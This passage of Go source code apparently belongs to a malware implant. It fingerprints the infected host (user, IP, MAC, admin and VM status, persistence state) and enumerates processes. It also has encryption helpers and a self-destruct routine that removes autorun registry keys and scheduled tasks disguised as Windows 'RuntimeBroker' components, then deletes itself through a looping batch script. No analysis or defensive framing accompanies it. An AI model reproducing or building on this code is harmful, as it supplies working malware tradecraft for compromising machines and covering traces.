func sysinfoMap() map[string]interface{} {
	host, _ := os.Hostname()
	uname := ""
	if cu, err := user.Current(); err == nil {
		uname = cu.Username
	}
	return map[string]interface{}{
		"hostname":    host,
		"username":    uname,
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
		"internal_ip": internalIP(),
		"mac":         primaryMAC(),
		"cpu":         fmt.Sprintf("%d cores", runtime.NumCPU()),
		"ram":         fmt.Sprintf("%d MB", memMB()),
		"is_vm":       vmMode,
		"is_admin":    isAdmin(),
		"pid":         os.Getpid(),
		"ppid":        os.Getppid(),
		"persisted":   persisted,
		"version":     "3.0",
	}
}

func internalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok &&
			!ipnet.IP.IsLoopback() &&
			ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return ""
}

func primaryMAC() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) == 0 {
			continue
		}
		if iface.Flags&net.FlagUp != 0 &&
			iface.Flags&net.FlagLoopback == 0 &&
			iface.Flags&net.FlagBroadcast != 0 {
			return iface.HardwareAddr.String()
		}
	}
	return ""
}

func memMB() int64 {
	if runtime.GOOS != "windows" {
		return 0
	}
	var ms windows.MemoryStatusEx
	ms.Length = uint32(windows.SizeofMemoryStatusEx)
	if err := windows.GlobalMemoryStatusEx(&ms); err != nil {
		return 0
	}
	return int64(ms.TotalPhys / 1024 / 1024)
}

func isAdmin() bool {
	if runtime.GOOS != "windows" {
		return os.Geteuid() == 0
	}
	var sid *windows.SID
	if err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY, 2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &sid,
	); err != nil {
		return false
	}
	defer windows.FreeSid(sid)
	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return err == nil && member
}

func selfDestruct() {
	self, err := os.Executable()
	if err != nil {
		os.Exit(0)
	}
	if runtime.GOOS == "windows" {
		k, err := registry.OpenKey(registry.CURRENT_USER,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.SET_VALUE)
		if err == nil {
			_ = k.DeleteValue("WindowsRuntimeBroker")
			k.Close()
		}
		k2, err := registry.OpenKey(registry.LOCAL_MACHINE,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.SET_VALUE)
		if err == nil {
			_ = k2.DeleteValue("WindowsRuntimeBroker")
			k2.Close()
		}
		wmic := exec.Command("wmic", "startup", "where", "name='RuntimeBroker'", "delete")
		_ = wmic.Run()
		_ = exec.Command("schtasks", "/Delete", "/F",
			"/TN", `\Microsoft\Windows\RuntimeBrokerUpdate`).Run()
		_ = exec.Command("schtasks", "/Delete", "/F",
			"/TN", `\Microsoft\Windows\RuntimeBrokerCheck`).Run()
		_ = exec.Command("schtasks", "/Delete", "/F",
			"/TN", `\Microsoft\Windows\RuntimeBrokerIdle`).Run()
		bat := filepath.Join(os.TempDir(), randHex(8)+".bat")
		content := fmt.Sprintf("@echo off\r\n:l\r\ndel /f /q \"%s\"\r\nif exist \"%s\" goto l\r\ndel /f /q \"%%~f0\"\r\n", self, self)
		_ = os.WriteFile(bat, []byte(content), 0644)
		_ = exec.Command("cmd", "/C", "start", "/b", bat).Start()
	} else {
		_ = os.Remove(self)
	}
	os.Exit(0)
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func sha256Hash(data []byte) []byte {
	h := sha256.Sum256(data)
	return h[:]
}

func aesGCMEncrypt(key, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, g.NonceSize())
	_, _ = rand.Read(nonce)
	return g.Seal(nonce, nonce, plain, nil), nil
}

func aesGCMDecrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := g.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return g.Open(nil, nonce, ct, nil)
}

func xorCrypt(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func processList() string {
	if runtime.GOOS != "windows" {
		out, _ := exec.Command("ps", "aux").Output()
		return string(out)
	}
	snap := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if snap == windows.InvalidHandle {
		return "snapshot failed"
	}
	defer windows.CloseHandle(snap)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return "Process32First failed"
	}
	var b strings.Builder
	for {
		syscall.UTF16ToString(pe.ExeFile[:])
		name := syscall.UTF16ToString(pe.ExeFile[:])
		idx := strings.IndexByte(name, 0)
		if idx >= 0 {
			name = name[:idx]
		}
		fmt.Fprintf(&b, "%6d %s\n", pe.ProcessID, name)
		if err := windows.Process32Next(snap, &pe); err != nil {
			break
		}
	}
	return b.String()
}
